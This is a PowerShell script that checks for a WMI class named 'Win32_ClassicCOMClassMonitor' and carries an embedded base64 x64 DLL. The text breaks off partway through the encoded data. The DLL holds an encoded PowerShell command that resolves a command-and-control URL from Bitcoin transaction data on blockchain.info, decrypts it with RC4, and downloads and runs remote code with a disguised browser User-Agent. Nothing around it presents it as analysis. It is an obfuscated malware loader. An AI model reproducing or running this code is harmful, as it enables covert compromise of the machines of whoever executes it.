If ((Get-WmiObject -Class "Win32_ClassicCOMClassMonitor" -List -Namespace "root\cimv2") -eq $null) {

    If ((Get-WmiObject Win32_OperatingSystem).OSArchitecture.Contains("64")) {
        $encoded_dll = "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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQQACAAQAAAPBAAIABAAAAAAAAAAAAAAD/////////////////////L2QgL2MgcG93ZXJzaGVsbC5leGUgLW5vcCAtZW5jIEpBQkZBRDBBZXdBa0FFUUFMQUFrQUVzQVBRQWtBRUVBY2dCbkFITUFPd0FrQUVvQVBRQXdBRHNBSkFCVEFEMEFNQUF1QUM0QU1nQTFBRFVBT3dBd0FDNEFMZ0F5QURVQU5RQjhBQ1VBZXdBa0FFb0FQUUFvQUNRQVNnQXJBQ1FBVXdCYkFDUUFYd0JkQUNzQUpBQkxBRnNBSkFCZkFDVUFKQUJMQUM0QVRBQmxBRzRBWndCMEFHZ0FYUUFwQUNVQU1nQTFBRFlBT3dBa0FGTUFXd0FrQUY4QVhRQXNBQ1FBVXdCYkFDUUFTZ0JkQUQwQUpBQlRBRnNBSkFCS0FGMEFMQUFrQUZNQVd3QWtBRjhBWFFCOUFEc0FKQUJKQUQwQUpBQktBRDBBTUFBN0FDUUFTQUE5QURBQU93QWtBRVFBZkFBbEFIc0FKQUJKQUQwQUtBQWtBRWtBS3dBeEFDa0FKUUF5QURVQU5nQTdBQ1FBU0FBOUFDZ0FKQUJJQUNzQUpBQlRBRnNBSkFCSkFGMEFLUUFsQURJQU5RQTJBRHNBSkFCVEFGc0FKQUJKQUYwQUxBQWtBRk1BV3dBa0FFZ0FYUUE5QUNRQVV3QmJBQ1FBU0FCZEFDd0FKQUJUQUZzQUpBQkpBRjBBT3dBa0FGOEFMUUJpQUhnQWJ3QnlBQ1FBVXdCYkFDZ0FKQUJUQUZzQUpBQkpBRjBBS3dBa0FGTUFXd0FrQUVnQVhRQXBBQ1VBTWdBMUFEWUFYUUI5QUgwQUNnQm1BSFVBYmdCakFIUUFhUUJ2QUc0QUlBQkhBR1VBZEFBdEFFTUFRd0JWQUhJQWJBQWdBSHNBQ2dBSkFDUUFRd0J5QUhrQWNBQjBBRzhBUVFCa0FHUUFjZ0JsQUhNQWN3QWdBRDBBSUFBaUFHSUFZd0F4QUhFQVlRQmhBR1FBTXdCeEFHMEFaZ0JxQURjQU5RQnRBRE1BTndBMUFIWUFhQUJvQUd3QWNnQXpBRGNBTkFBekFHNEFjZ0J0QURnQU5BQjJBR1VBY3dCNUFIZ0FZUUJvQUhnQU5BQTVBQ0lBQ2dBSkFDUUFRZ0JzQUc4QVl3QnJBRU1BYUFCaEFHa0FiZ0JWQUhJQWJBQWdBRDBBSUFBaUFHZ0FkQUIwQUhBQWN3QTZBQzhBTHdCaUFHd0Fid0JqQUdzQVl3Qm9BR0VBYVFCdUFDNEFhUUJ1QUdZQWJ3QXZBSElBWVFCM0FHRUFaQUJrQUhJQUx3QWlBQ0FBS3dBZ0FDUUFRd0J5QUhrQWNBQjBBRzhBUVFCa0FHUUFjZ0JsQUhNQWN3QWdBQ3NBSUFBaUFEOEFiQUJwQUcwQWFRQjBBRDBBTVFBaUFBb0FDUUFrQUZRQVRBQlRBREVBTVFCQkFIWUFZUUJwQUd3QUlBQTlBQ0FBS0FCYkFHVUFiZ0IxQUcwQVhRQTZBRG9BUndCbEFIUUFUZ0JoQUcwQVpRQnpBQ2dBV3dCVEFIa0Fjd0IwQUdVQWJRQXVBRTRBWlFCMEFDNEFVd0JsQUdNQWRRQnlBR2tBZEFCNUFGQUFjZ0J2QUhRQWJ3QmpBRzhBYkFCVUFIa0FjQUJsQUYwQUtRQXBBQ0FBTFFCakFHOEFiZ0IwQUdFQWFRQnVBSE1BSUFBaUFGUUFiQUJ6QURFQU1RQWlBQW9BQ1FCcEFHWUFJQUFvQUNRQVZBQk1BRk1BTVFBeEFFRUFkZ0JoQUdrQWJBQXBBQ0FBZXdBS0FBa0FDUUJiQUU0QVpRQjBBQzRBVXdCbEFISUFkZ0JwQUdNQVpRQlFBRzhBYVFCdUFIUUFUUUJoQUc0QVlRQm5BR1VBY2dCZEFEb0FPZ0JUQUdVQVl3QjFBSElBYVFCMEFIa0FVQUJ5QUc4QWRBQnZBR01BYndCc0FDQUFQUUFnQUZzQVRnQmxBSFFBTGdCVEFHVUFZd0IxQUhJQWFRQjBBSGtBVUFCeUFHOEFkQUJ2QUdNQWJ3QnNBRlFBZVFCd0FHVUFYUUE2QURvQVZBQnNBSE1BTVFBekFDQUFMUUJpQUc4QWNnQWdBRnNBVGdCbEFIUUFMZ0JUQUdVQVl3QjFBSElBYVFCMEFIa0FVQUJ5QUc4QWRBQnZBR01BYndCc0FGUUFlUUJ3QUdVQVhRQTZBRG9BVkFCc0FITUFNUUF5QUNBQUxRQmlBRzhBY2dBZ0FGc0FUZ0JsQUhRQUxnQlRBR1VBWXdCMUFISUFhUUIwQUhrQVVBQnlBRzhBZEFCdkFHTUFid0JzQUZRQWVRQndBR1VBWFFBNkFEb0FWQUJzQUhNQU1RQXhBQW9BQ1FBSkFDUUFWd0JsQUdJQVF3QnNBR2tBWlFCdUFIUUFJQUE5QUNBQVRnQmxBSGNBTFFCUEFHSUFhZ0JsQUdNQWRBQWdBRk1BZVFCekFIUUFaUUJ0QUM0QVRnQmxBSFFBTGdCWEFHVUFZZ0JEQUd3QWFRQmxBRzRBZEFBS0FBa0FDUUFrQUZjQVpRQmlBRU1BYkFCcEFHVUFiZ0IwQUM0QVNBQmxBR0VBWkFCbEFISUFjd0F1QUVFQVpBQmtBQ2dBSWdCVkFITUFaUUJ5QUMwQVFRQm5BR1VBYmdCMEFDSUFMQUFnQUNRQVZRQkJBQ2tBQ2dBSkFBa0FKQUJTQUdVQWN3QndBRzhBYmdCekFHVUFJQUE5QUNBQUpBQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXVBRVFBYndCM0FHNEFiQUJ2QUdFQVpBQlRBSFFBY2dCcEFHNEFad0FvQUNRQVFnQnNBRzhBWXdCckFFTUFhQUJoQUdrQWJnQlZBSElBYkFBcEFBb0FDUUI5QUNBQVpRQnNBSE1BWlFBZ0FIc0FDZ0FKQUFrQUpBQlhBR2tBYmdCSUFIUUFkQUJ3QUNBQVBRQWdBRTRBWlFCM0FDMEFUd0JpQUdvQVpRQmpBSFFBSUFBdEFFTUFid0J0QUU4QVlnQnFBR1VBWXdCMEFDQUFWd0JwQUc0QVNBQjBBSFFBY0FBdUFGY0FhUUJ1QUVnQWRBQjBBSEFBVWdCbEFIRUFkUUJsQUhNQWRBQXVBRFVBTGdBeEFBb0FDUUFKQUNRQVZ3QnBBRzRBU0FCMEFIUUFjQUF1QUU4QWNBQmxBRzRBS0FBaUFFY0FSUUJVQUNJQUxBQWdBQ1FBUWdCc0FHOEFZd0JyQUVNQWFBQmhBR2tBYmdCVkFISUFiQUFzQUNBQUpBQm1BR0VBYkFCekFHVUFLUUFLQUFrQUNRQWtBRmNBYVFCdUFFZ0FkQUIwQUhBQUxnQlRBR1VBZEFCU0FHVUFjUUIxQUdVQWN3QjBBRWdBWlFCaEFHUUFaUUJ5QUNnQUlnQlZBSE1BWlFCeUFDMEFRUUJuQUdVQWJnQjBBQ0lBTEFBZ0FDUUFWUUJCQUNrQUNnQUpBQWtBSkFCWEFHa0FiZ0JJQUhRQWRBQndBQzRBVXdCbEFHNEFaQUFvQUNrQUNnQUpBQWtBSkFCU0FHVUFjd0J3QUc4QWJnQnpBR1VBSUFBOUFDQUFKQUJYQUdrQWJnQklBSFFBZEFCd0FDNEFVZ0JsQUhNQWNBQnZBRzRBY3dCbEFGUUFaUUI0QUhRQUNnQUpBSDBBQ2dBSkFDUUFVZ0JsQUhNQWNBQnZBRzRBY3dCbEFFMEFZUUIwQUdNQWFBQWdBRDBBSUFBa0FGSUFaUUJ6QUhBQWJ3QnVBSE1BWlFBZ0FDMEFiUUJoQUhRQVl3Qm9BQ0FBSndBaUFITUFZd0J5QUdrQWNBQjBBQ0lBT2dBaUFEWUFZUUFvQUZ3QWR3QXFBQ2tBSndBZ0FId0FJQUFsQUNBQWV3QWtBRTBBWVFCMEFHTUFhQUJsQUhNQVd3QXhBRjBBZlFBS0FBa0FKQUJWQUZJQVRBQklBR1VBZUFBZ0FEMEFJQUFrQUZJQVpRQnpBSEFBYndCdUFITUFaUUJOQUdFQWRBQmpBR2dBTGdCVEFIVUFZZ0J6QUhRQWNnQnBBRzRBWndBb0FESUFMQUFnQUNRQVVnQmxBSE1BY0FCdkFHNEFjd0JsQUUwQVlRQjBBR01BYUFBdUFFd0FaUUJ1QUdjQWRBQm9BQ0FBTFFBZ0FESUFLUUFLQUFrQUpBQkRBR2tBY0FCb0FHVUFjZ0FnQUQwQUlBQmJBR0lBZVFCMEFHVUFXd0JkQUYwQUlBQXRBSE1BY0FCc0FHa0FkQUFnQUNnQUpBQlZBRklBVEFCSUFHVUFlQUFnQUMwQWNnQmxBSEFBYkFCaEFHTUFaUUFnQUNjQUxnQXVBQ2NBTEFBZ0FDY0FNQUI0QUNRQUpnQWdBQ2NBS1FBS0FBa0FKQUJMQUdVQWVRQWdBRDBBSUFBb0FEQUFlQUJFQUVVQUxBQWdBREFBZUFCR0FFRUFMQUFnQURBQWVBQkRBRVVBS1FBS0FBa0FKQUJWQUZJQVRBQlFBR3dBWVFCcEFHNEFWQUJsQUhnQWRBQWdBRDBBSUFCYkFGTUFlUUJ6QUhRQVpRQnRBQzRBVkFCbEFIZ0FkQUF1QUVVQWJnQmpBRzhBWkFCcEFHNEFad0JkQURvQU9nQkJBRk1BUXdCSkFFa0FMZ0JIQUdVQWRBQlRBSFFBY2dCcEFHNEFad0FvQUNnQUpnQWdBQ1FBUlFBZ0FDUUFRd0JwQUhBQWFBQmxBSElBSUFBa0FFc0FaUUI1QUNrQUtRQUtBQWtBY2dCbEFIUUFkUUJ5QUc0QUlBQWlBR2dBZEFCMEFIQUFjd0E2QUM4QUx3QWlBQ0FBS3dBZ0FDUUFWUUJTQUV3QVVBQnNBR0VBYVFCdUFGUUFaUUI0QUhRQUNnQjlBQW9BQ2dBa0FIQUFZUUIwQUdnQUlBQTlBQ0FBSWdBdkFHTUFMd0J0QUdrQUlnQUtBQ1FBVndCbEFHSUFRd0JzQUdrQVpRQnVBSFFBSUFBOUFDQUFUZ0JsQUhjQUxRQlBBR0lBYWdCbEFHTUFkQUFnQUZNQWVRQnpBSFFBWlFCdEFDNEFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQUtBQ1FBVndCbEFHSUFRd0JzQUdrQVpRQnVBSFFBTGdCSUFHVUFZUUJrQUdVQWNnQnpBQzRBUVFCa0FHUUFLQUFpQUZVQWN3QmxBSElBTFFCQkFHY0FaUUJ1QUhRQUlnQXNBQ0FBSWdCTkFHOEFlZ0JwQUd3QWJBQmhBQzhBTlFBdUFEQUFJQUFvQUZjQWFRQnVBR1FBYndCM0FITUFJQUJPQUZRQUlBQXhBREFBTGdBd0FEc0FJQUJYQUdrQWJnQTJBRFFBT3dBZ0FIZ0FOZ0EwQUNrQUlBQkJBSEFBY0FCc0FHVUFWd0JsQUdJQVN3QnBBSFFBTHdBMUFETUFOd0F1QURNQU5nQW9BRXNBU0FCVUFFMEFUQUFzQUNBQWJBQnBBR3NBWlFBZ0FFY0FaUUJqQUdzQWJ3QXBBQ0FBUXdCb0FISUFid0J0QUdVQUx3QTVBREFBTGdBd0FDNEFOQUEwQURNQU1BQXVBRElBTVFBeUFDQUFVd0JoQUdZQVlRQnlBR2tBTHdBMUFETUFOd0F1QURNQU5nQWlBQ2tBQ2dBa0FFTUFRd0JWQUhJQWJBQWdBRDBBSUFBb0FFY0FaUUIwQUMwQVF3QkRBRlVBY2dCc0FDa0FJQUFyQUNBQUpBQndBR0VBZEFCb0FBb0FTUUJGQUZnQUtBQW9BQ1FBVndCbEFHSUFRd0JzQUdrQVpRQnVBSFFBTGdCRUFHOEFkd0J1QUd3QWJ3QmhB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